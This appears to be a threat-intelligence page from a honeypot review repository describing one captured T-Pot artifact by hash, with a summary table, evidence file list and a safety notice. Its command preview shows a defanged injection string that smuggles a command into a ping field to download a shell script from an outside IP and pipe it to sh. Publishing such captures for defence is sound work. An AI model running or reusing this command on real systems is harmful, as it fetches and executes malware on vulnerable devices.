# 534ce8dde5c9ed084a26b6d9d9568859b54e8e6d655d9de2fc4e28f404ac378f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `534ce8dde5c9ed084a26b6d9d9568859b54e8e6d655d9de2fc4e28f404ac378f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
ping=[internal-ip-redacted]`cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s airspan;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|s
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
